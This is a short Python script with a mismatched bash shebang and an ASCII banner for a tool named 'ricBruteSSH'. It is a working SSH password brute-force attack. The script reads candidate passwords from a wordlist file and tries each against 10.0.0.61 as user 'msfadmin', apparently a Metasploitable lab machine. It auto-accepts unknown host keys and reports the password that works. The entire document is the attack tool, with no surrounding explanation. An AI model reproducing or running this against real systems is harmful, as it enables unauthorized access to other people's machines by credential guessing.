#!/bin/bash
import paramiko

print("       .__      __________                __           _________ _________ ___ ___")
print("_______|__| ____\______   \_______ __ ___/  |_  ____  /   _____//   _____//   |   \ ")
print("\_  __ \  |/ ___\|    |  _/\_  __ \  |  \   __\/ __ \ \_____  \ \_____  \/    ~    \ ")
print(" |  | \/  \  \___|    |   \ |  | \/  |  /|  | \  ___/ /        \/        \    Y    /")
print(" |__|  |__|\___  >______  / |__|  |____/ |__|  \___  >_______  /_______  /\___|_  /") 
print("               \/       \/                         \/        \/        \/       \/  ")
print("============================https://github.com/ricardoazev==========================")
ssh = paramiko.SSHClient()
ssh.load_system_host_keys()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

with  open('listSenhas.txt') as f:

   for palavra in f.readlines():

    senha = (palavra.strip())

    try:

       ssh.connect('10.0.0.61', username='msfadmin', password=senha)

    except paramiko.ssh_exception.AuthenticationException:

       print("Testando com: ",senha)

    else:

       print("[+] Senha Encontrada ---> ",senha)
       break
ssh.close()
